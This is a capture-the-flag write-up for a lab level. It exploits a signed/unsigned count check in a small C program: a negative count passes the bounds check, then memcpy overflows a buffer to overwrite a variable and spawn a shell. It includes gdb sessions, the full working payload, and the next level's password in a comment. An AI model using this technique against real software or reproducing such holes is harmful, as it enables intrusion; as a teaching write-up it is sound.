## Level 7:

```c
 1 //written by bla
 2 #include <stdio.h>
 3 #include <string.h>
 4 #include <unistd.h>
 5 
 6 
 7 
 8 int main(int argc, char **argv)
 9 {
10 
11         int count = atoi(argv[1]);
12         int buf[10];
13 
14         if(count >= 10 )
15                 return 1;
16 
17 
18         memcpy(buf, argv[2], count * sizeof(int));
19 
20         if(count == 0x574f4c46) {
21         printf("WIN!\n");
22                 execl("/bin/sh", "sh" ,NULL);
23     } else
24                 printf("Not today son\n");
25 
26 
27         return 0;
28 }
```

Here we see there is a buffer with size 10 and no obvious way to overflow it as there is a check so that the count is always less then 10.
We can also see that *memcpy* uses the raw count variable. The vulnerability here is that *memcpy* doesn't check if the size is bigger nor negative! It takes size_t and we can give it negative number which if we cast it into unsigned value it will be massive while the first check will still see it as less then 10. 

```console
(gdb) disass main
Dump of assembler code for function main:
   ...
   0x08048462 <+78>:	call   0x8048334 <memcpy@plt>
   0x08048467 <+83>:	cmpl   $0x574f4c46,-0xc(%ebp)
   0x0804846e <+90>:	jne    0x804849a <main+134>
   0x08048470 <+92>:	movl   $0x8048584,(%esp)
   0x08048477 <+99>:	call   0x8048344 <printf@plt>
   0x0804847c <+104>:	movl   $0x0,0x8(%esp)
   0x08048484 <+112>:	movl   $0x804858a,0x4(%esp)
   0x0804848c <+120>:	movl   $0x804858d,(%esp)
   0x08048493 <+127>:	call   0x8048324 <execl@plt>
   0x08048498 <+132>:	jmp    0x80484a6 <main+146>
   0x0804849a <+134>:	movl   $0x8048595,(%esp)
   0x080484a1 <+141>:	call   0x8048344 <printf@plt>
   0x080484a6 <+146>:	movl   $0x0,-0x4c(%ebp)
   0x080484ad <+153>:	mov    -0x4c(%ebp),%eax
   0x080484b0 <+156>:	leave  
   0x080484b1 <+157>:	ret    
End of assembler dump.
```
To find the size needed to overflow I tried a few sizes and looked and the buffer to see how big the overflow was.

First I added a few breakpoints to help me locate the count and see the buffer and specific stages (*i.e.* 0x08048462 and 0x08048467).

```console
(gdb) b *0x08048462
Breakpoint 1 at 0x8048462
(gdb) b *0x08048467
Breakpoint 2 at 0x8048467
(gdb) r $(python -c 'print "-2147483648" + " " + "A"*100')
...
(gdb) c
Continuing.

Breakpoint 2, 0x08048467 in main ()
(gdb) x/44xw $esp
0xbffffb80:	0xbffffba0	0xbffffdc9	0x00000000	0x00000005
0xbffffb90:	0x0177ff8e	0xb7fc2000	0xb7e1ae18	0xb7fd5240
0xbffffba0:	0xb7fc2000	0xbffffc84	0xb7ffed00	0x00200000
0xbffffbb0:	0xffffffff	0x08049688	0xbffffbc8	0x080482f0
0xbffffbc0:	0x00000003	0x08049688	0xbffffbe8	0x080484e9
0xbffffbd0:	0xb7fc23dc	0x0804819c	0x080484db	0x80000000
0xbffffbe0:	0x00000003	0xb7fc2000	0x00000000	0xb7e26286
0xbffffbf0:	0x00000003	0xbffffc84	0xbffffc94	0x00000000
0xbffffc00:	0x00000000	0x00000000	0xb7fc2000	0xb7fffc0c
0xbffffc10:	0xb7fff000	0x00000000	0x00000003	0xb7fc2000
0xbffffc20:	0x00000000	0x19254d23	0x22162133	0x00000000
```
-2147483648 did not overflow the memcpy so I tried larger number.

```console
...
(gdb) r $(python -c 'print "-2147483620" + " " + "A"*100')
Starting program: /levels/level07 $(python -c 'print "-2147483620" + " " + "A"*100')

Breakpoint 1, 0x08048462 in main ()
(gdb) c
Continuing.

Breakpoint 2, 0x08048467 in main ()
(gdb) x/44xw $esp
0xbffffb80:	0xbffffba0	0xbffffdc9	0x00000070	0x00000005
0xbffffb90:	0x0177ff8e	0xb7fc2000	0xb7e1ae18	0xb7fd5240
0xbffffba0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbb0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbc0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbd0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbe0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbf0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc00:	0x41414141	0x47445800	0x5345535f	0x4e4f4953
0xbffffc10:	0xb7fff000	0x00000000	0x00000003	0xb7fc2000
0xbffffc20:	0x00000000	0xff51623e	0xc4620e2e	0x00000000
...
```

Now I was finally overflow the buffer and was able to change the count variable. To figure out the location of the variable I can again check the cmpl instruction.

```console
0x08048467 <+83>:	cmpl   $0x574f4c46,-0xc(%ebp)
```

Now that I have a location I checked how many A's were in ths buffer and trivialy I determined I need 60 A's (or some other bytes) after which I need the number which is checked so my final payload looked like this:

```console
(gdb)  r $(python -c 'print "-2147483620" + " " + "A"*60 + "\x46\x4c\x4f\x57"')
Starting program: /levels/level07 $(python -c 'print "-2147483600" + " " + "A"*60 + "\x46\x4c\x4f\x57"')
WIN!
process 14128 is executing new program: /bin/bash
sh-4.3$
```

<!-- Level 8 password ==> VSIhoeMkikH6SGht -->